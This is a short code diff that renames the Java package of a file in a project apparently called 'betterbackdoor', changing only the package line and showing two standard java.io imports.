@@ -1,4 +1,4 @@
-package com.github.thatcherdev.betterbackdoor.backdoor;
+package com.thatcherdev.betterbackdoor.backdoor;
 
 import java.io.File;
 import java.io.PrintWriter;
